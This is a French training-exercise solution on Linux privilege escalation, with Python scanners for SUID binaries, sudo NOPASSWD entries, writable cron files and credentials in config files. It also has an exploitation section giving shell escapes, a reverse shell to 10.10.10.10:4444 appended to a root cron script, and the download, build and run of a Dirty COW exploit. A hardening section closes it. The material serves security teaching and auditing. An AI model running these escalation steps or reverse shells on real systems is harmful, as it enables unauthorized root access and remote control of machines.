SOLUTION EXERCICE 24: PRIVILEGE ESCALATION
==========================================

AVERTISSEMENT: Solution éducative strictement pour tests autorisés.

Cette solution présente des implémentations pour l'énumération et l'identification
de vecteurs d'escalade de privilèges. Usage professionnel et éthique uniquement.

================================
IMPLÉMENTATION COMPLÈTE
================================

Voir les implémentations détaillées de chaque défi dans main.py avec les TODOs complétés.

EXEMPLES CLÉS:

1. SUID Scanner:
```python
```python
def find_suid_binaries(search_path='/'):
    try:
        result = subprocess.run(
            ['find', search_path, '-perm', '-4000', '-type', 'f'],
            capture_output=True,
            text=True,
            stderr=subprocess.DEVNULL
        )

        binaries = []
        for line in result.stdout.splitlines():
            if not line:
                continue

            try:
                stat = os.stat(line)
                binary_name = os.path.basename(line)

                binaries.append({
                    'path': line,
                    'name': binary_name,
                    'owner': pwd.getpwuid(stat.st_uid).pw_name,
                    'permissions': oct(stat.st_mode)[-4:],
                    'gtfobins': binary_name in GTFOBINS,
                    'priority': 'HIGH' if binary_name in GTFOBINS else 'MEDIUM'
                })
            except (FileNotFoundError, PermissionError, KeyError):
                continue

        return sorted(binaries, key=lambda x: x['priority'], reverse=True)

    except Exception as e:
        print(f"[!] Erreur SUID scan: {e}")
        return []
```
```

2. Sudo Analyzer:
```python
```python
def get_sudo_permissions():
    try:
        result = subprocess.run(
            ['sudo', '-l'],
            capture_output=True,
            text=True,
            timeout=5
        )
        return result.stdout
    except subprocess.TimeoutExpired:
        return "[!] Timeout - password probablement requis"
    except FileNotFoundError:
        return "[!] sudo non installé"
    except Exception as e:
        return f"[!] Erreur: {e}"

def detect_nopasswd_entries(sudo_output):
    nopasswd = []

    for line in sudo_output.splitlines():
        if 'NOPASSWD' in line and '(' in line:
            parts = line.split('NOPASSWD:')
            if len(parts) > 1:
                command = parts[1].strip()
                nopasswd.append({
                    'command': command,
                    'priority': 'HIGH',
                    'exploitation': f"sudo {command} avec payload injecté"
                })

    return nopasswd
```
```

3. Cron Scanner:
```python
```python
def find_writable_cron_files():
    writable = []
    cron_dirs = ['/etc/cron.daily/', '/etc/cron.hourly/', '/etc/cron.weekly/']

    for cron_dir in cron_dirs:
        if not os.path.exists(cron_dir):
            continue

        for filename in os.listdir(cron_dir):
            filepath = os.path.join(cron_dir, filename)

            if os.path.isfile(filepath):
                try:
                    # Vérifier si writable
                    if os.access(filepath, os.W_OK):
                        stat = os.stat(filepath)
                        owner = pwd.getpwuid(stat.st_uid).pw_name

                        writable.append({
                            'path': filepath,
                            'owner': owner,
                            'permissions': oct(stat.st_mode)[-4:],
                            'priority': 'HIGH' if owner == 'root' else 'MEDIUM',
                            'exploitation': f"echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' >> {filepath}"
                        })
                except (PermissionError, KeyError):
                    continue

    return writable
```
```

4. Credential Scanner:
```python
```python
import re

def scan_config_files(search_paths):
    findings = []
    sensitive_patterns = {
        'password': r'password["\'\s]*[:=]["\'\s]*([^\s"\']+)',
        'api_key': r'api[_-]?key["\'\s]*[:=]["\'\s]*([^\s"\']+)',
        'secret': r'secret["\'\s]*[:=]["\'\s]*([^\s"\']+)'
    }

    for search_path in search_paths:
        for root, dirs, files in os.walk(search_path):
            for filename in files:
                if filename.endswith(('.env', '.conf', '.config', '.ini')):
                    filepath = os.path.join(root, filename)

                    try:
                        with open(filepath, 'r', errors='ignore') as f:
                            content = f.read()

                        for secret_type, pattern in sensitive_patterns.items():
                            matches = re.findall(pattern, content, re.IGNORECASE)

                            if matches:
                                findings.append({
                                    'file': filepath,
                                    'type': secret_type,
                                    'value': matches[0][:20] + '...',  # Tronquer
                                    'priority': 'MEDIUM'
                                })
                    except (PermissionError, FileNotFoundError):
                        continue

    return findings
```
```

5. Full Enumeration:
```python
```python
class PrivEscEnumerator:
    def run_full_enumeration(self):
        print("[*] Démarrage énumération complète...")

        # System info
        print("[*] Collecte informations système...")
        self.findings['system'] = SystemEnumerator.get_system_info()

        # SUID scan
        print("[*] Scan binaires SUID...")
        self.findings['suid'] = SUIDScanner.scan_and_prioritize()

        # Sudo
        print("[*] Analyse permissions sudo...")
        sudo_output = SudoAnalyzer.get_sudo_permissions()
        sudo_perms = SudoAnalyzer.parse_sudo_permissions(sudo_output)
        self.findings['sudo'] = SudoAnalyzer.detect_nopasswd_entries(sudo_perms)

        # Cron
        print("[*] Scan cron jobs...")
        self.findings['cron'] = CronScanner.find_writable_cron_files()

        # Credentials
        print("[*] Recherche credentials...")
        self.findings['credentials'] = CredentialScanner.scan_config_files(['/home', '/var'])

        # Kernel
        print("[*] Vérification kernel exploits...")
        kernel_version = KernelExploitChecker.get_kernel_version()
        self.findings['kernel'] = KernelExploitChecker.check_known_cves(kernel_version)

        print("[+] Énumération terminée!")
        return self.findings

    def generate_report(self, output_format='text'):
        report = "PRIVILEGE ESCALATION ENUMERATION REPORT\n"
        report += "=" * 70 + "\n\n"

        # System info
        report += "SYSTEM INFORMATION:\n"
        report += f"  OS: {self.findings['system'].get('os', 'N/A')}\n"
        report += f"  Kernel: {self.findings['system'].get('kernel', 'N/A')}\n"
        report += f"  Current User: {self.findings['system'].get('user', 'N/A')}\n\n"

        # HIGH priority findings
        report += "[HIGH PRIORITY FINDINGS]\n\n"

        for suid in self.findings['suid']:
            if suid['priority'] == 'HIGH':
                report += f"[HIGH] SUID Binary: {suid['path']}\n"
                report += f"  Owner: {suid['owner']}\n"
                report += f"  GTFOBins: Yes\n"
                report += f"  Exploitation: Check https://gtfobins.github.io/{suid['name']}\n\n"

        for sudo in self.findings['sudo']:
            report += f"[HIGH] Sudo NOPASSWD: {sudo['command']}\n"
            report += f"  Exploitation: {sudo['exploitation']}\n\n"

        for cron in self.findings['cron']:
            if cron['priority'] == 'HIGH':
                report += f"[HIGH] Writable Cron Job: {cron['path']}\n"
                report += f"  Owner: {cron['owner']}\n"
                report += f"  Exploitation: {cron['exploitation']}\n\n"

        # Recommendations
        report += "\nRECOMMENDED EXPLOITATION ORDER:\n"
        report += "1. Sudo NOPASSWD entries (easiest, cleanest)\n"
        report += "2. SUID binaries with GTFOBins (reliable)\n"
        report += "3. Writable cron jobs (requires patience)\n"
        report += "4. Kernel exploits (last resort, risk of crash)\n"

        return report
```
```

================================
UTILISATION COMPLÈTE
================================

Script d'utilisation:
```python
#!/usr/bin/env python3

def main():
```python
    # Créer énumérateur
    enumerator = PrivEscEnumerator(verbose=True)

    # Exécuter scan complet
    findings = enumerator.run_full_enumeration()

    # Prioriser
    prioritized = enumerator.prioritize_findings()

    # Générer rapport
    report = enumerator.generate_report()

    # Afficher
    print(report)

    # Sauvegarder
    with open('privesc_report.txt', 'w') as f:
        f.write(report)

    print("\n[+] Rapport sauvegardé: privesc_report.txt")

if __name__ == "__main__":
    main()
```
```

================================
EXEMPLES D'EXPLOITATION
================================

1. SUID vim:
```bash
vim -c ':!/bin/sh'
vim -c ':set shell=/bin/sh'
vim -c ':shell'
```

2. Sudo find NOPASSWD:
```bash
sudo find . -exec /bin/sh \; -quit
sudo find . -exec whoami \;
```

3. Writable cron:
```bash
echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' >> /etc/cron.daily/backup.sh
# Attendre exécution
```

4. Kernel Dirty COW:
```bash
# Télécharger exploit
wget https://github.com/dirtycow/dirtycow.github.io/raw/master/pokemon.c
gcc -pthread pokemon.c -o pokemon
./pokemon
```

================================
DÉFENSE ET HARDENING
================================

1. Minimiser SUID binaries:
```bash
# Audit
find / -perm -4000 -type f -ls

# Retirer SUID si non nécessaire
chmod u-s /usr/bin/suspicious-binary
```

2. Sécuriser sudo:
```bash
# Dans visudo:
# Éviter NOPASSWD sauf absolument nécessaire
# Éviter wildcards
# Spécifier chemins complets

# BON:
user ALL=(ALL) /usr/bin/systemctl restart nginx

# MAUVAIS:
user ALL=(ALL) NOPASSWD: /usr/bin/*
```

3. Protéger cron:
```bash
# Permissions strictes
chmod 700 /etc/cron.daily/*
chown root:root /etc/cron.daily/*

# Auditer changements
auditctl -w /etc/cron.d/ -p wa -k cron_changes
```

4. Maintenir système à jour:
```bash
# Ubuntu/Debian
apt update && apt upgrade

# CentOS/RHEL
yum update

# Vérifier kernel
uname -r
```

================================
CONCLUSION
================================

Ces outils d'énumération permettent d'identifier rapidement les vecteurs
d'escalade de privilèges. Utilisez-les pour:

1. DÉFENSE: Hardening de vos systèmes
2. AUDIT: Tests de sécurité autorisés
3. FORMATION: Compréhension des vulnérabilités

JAMAIS pour compromettre des systèmes sans autorisation.

La connaissance de ces techniques vous rend RESPONSABLE de les utiliser
éthiquement et légalement.

Pour aller plus loin:
- LinPEAS/WinPEAS scripts
- HackTheBox machines
- OSCP certification
- Defensive hardening guides
